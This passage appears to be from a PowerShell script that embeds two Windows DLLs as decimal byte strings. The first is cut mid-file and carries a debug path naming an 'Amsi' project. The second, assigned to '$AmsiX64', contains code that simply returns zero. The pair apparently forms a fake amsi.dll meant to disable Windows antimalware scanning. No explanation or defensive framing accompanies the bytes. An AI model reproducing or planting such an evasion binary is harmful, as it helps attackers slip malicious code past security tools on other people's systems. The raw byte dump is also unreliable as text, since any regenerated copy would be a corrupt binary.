0 0 0 0 0 0 0 0 0 0 0 0 4 48 0 16 128 33 0 16 1 0 0 0 112 32 0 16 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 75 26 0 0 82 83 68 83 69 10 117 219 0 114 41 77 133 149 98 78 29 103 122 248 7 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 20 0 0 0 20 0 0 0 1 0 0 0 19 0 0 0 71 67 84 76 0 16 0 0 124 12 0 0 46 116 101 120 116 36 109 110 0 0 0 0 0 32 0 0 112 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 112 32 0 0 4 0 0 0 46 48 48 99 102 103 0 0 116 32 0 0 4 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 120 32 0 0 4 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 124 32 0 0 4 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 128 32 0 0 4 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 132 32 0 0 4 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 136 32 0 0 4 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 140 32 0 0 4 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 144 32 0 0 4 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 160 32 0 0 220 0 0 0 46 114 100 97 116 97 0 0 128 33 0 0 4 0 0 0 46 114 100 97 116 97 36 115 120 100 97 116 97 0 0 0 132 33 0 0 128 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 4 36 0 0 4 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 8 36 0 0 4 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 12 36 0 0 4 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 16 36 0 0 4 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 24 36 0 0 124 0 0 0 46 120 100 97 116 97 36 120 0 0 0 0 148 36 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 208 36 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 228 36 0 0 112 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 84 37 0 0 136 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 24 0 0 0 46 100 97 116 97 0 0 0 24 48 0 0 112 3 0 0 46 98 115 115 0 0 0 0 0 64 0 0 20 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 80 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 80 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 254 255 255 255 0 0 0 0 208 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 110 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 0 0 0 0 233 17 0 16 0 0 0 0 254 255 255 255 0 0 0 0 212 255 255 255 0 0 0 0 254 255 255 255 203 18 0 16 234 18 0 16 0 0 0 0 254 255 255 255 0 0 0 0 216 255 255 255 0 0 0 0 254 255 255 255 215 22 0 16 234 22 0 16 20 37 0 0 0 0 0 0 0 0 0 0 220 37 0 0 48 32 0 0 44 37 0 0 0 0 0 0 0 0 0 0 164 38 0 0 72 32 0 0 228 36 0 0 0 0 0 0 0 0 0 0 206 39 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 198 38 0 0 0 39 0 0 20 39 0 0 40 39 0 0 68 39 0 0 186 39 0 0 164 39 0 0 138 39 0 0 116 39 0 0 94 39 0 0 226 38 0 0 0 0 0 0 184 37 0 0 84 37 0 0 152 37 0 0 118 37 0 0 194 37 0 0 0 0 0 0 154 38 0 0 140 38 0 0 116 38 0 0 88 38 0 0 60 38 0 0 26 38 0 0 8 38 0 0 250 37 0 0 238 37 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 72 0 109 101 109 115 101 116 0 0 53 0 95 101 120 99 101 112 116 95 104 97 110 100 108 101 114 52 95 99 111 109 109 111 110 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 56 0 95 105 110 105 116 116 101 114 109 0 57 0 95 105 110 105 116 116 101 114 109 95 101 0 65 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 53 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0"
    $AmsiX64 = "77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 